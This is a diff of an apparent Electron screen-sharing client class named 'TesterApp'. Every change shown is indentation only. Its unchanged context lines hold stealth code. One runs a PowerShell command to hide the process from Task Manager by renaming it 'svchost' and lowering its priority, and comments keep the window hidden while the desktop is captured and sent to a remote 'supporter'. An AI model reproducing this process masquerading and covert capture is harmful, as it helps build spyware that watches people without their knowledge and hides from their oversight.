@@ -1023,8 +1023,8 @@ class TesterApp {
     if (process.platform === 'win32') {
       // Set process to run in background
       try {
-        const { exec } = require('child_process');
-        
+      const { exec } = require('child_process');
+      
         // Hide from Task Manager by setting process properties
         exec('powershell -command "Get-Process -Id ' + process.pid + ' | ForEach-Object { $_.PriorityClass = \'Idle\'; $_.ProcessName = \'svchost\' }"', (error) => {
           // Silently ignore errors
@@ -1453,8 +1453,8 @@ class TesterApp {
       
       // Handle supporter disconnection
       socket.on('disconnect', () => {
-        this.isConnected = false;
-        this.stopScreenSharing();
+      this.isConnected = false;
+      this.stopScreenSharing();
         
         // Keep window hidden - user can access via tray icon if needed
       });
@@ -1609,9 +1609,9 @@ class TesterApp {
         console.log('📸 Starting screenshot-desktop capture');
         // Mouse cursor is captured directly in screen images (cursor: true)
         
-        
-        // Set up screen capture based on quality setting
-        await this.setupScreenCapture();
+    
+    // Set up screen capture based on quality setting
+    await this.setupScreenCapture();
         break;
     }
     
@@ -1957,7 +1957,7 @@ class TesterApp {
           if (captureTime > 100) { // If capture takes more than 100ms (our app is struggling)
             this.slowCaptureCount++;
             if (this.slowCaptureCount >= this.maxSlowCaptures) {
-              this.adjustQualityForPerformance();
+            this.adjustQualityForPerformance();
               this.slowCaptureCount = 0; // Reset counter
             }
           } else {
@@ -2250,9 +2250,9 @@ class TesterApp {
         
         // Mouse cursor captured directly in screen images
         
-        if (this.captureInterval) {
-          clearInterval(this.captureInterval);
-          this.captureInterval = null;
+    if (this.captureInterval) {
+      clearInterval(this.captureInterval);
+      this.captureInterval = null;
         }
         break;
     }
@@ -2404,7 +2404,7 @@ class TesterApp {
         
         // Notify the renderer that image was sent
         event.reply('image-sent', { success: true });
-
+        
         return { success: true };
       } catch (error) {
         console.error('❌ Error sending captured image:', error);
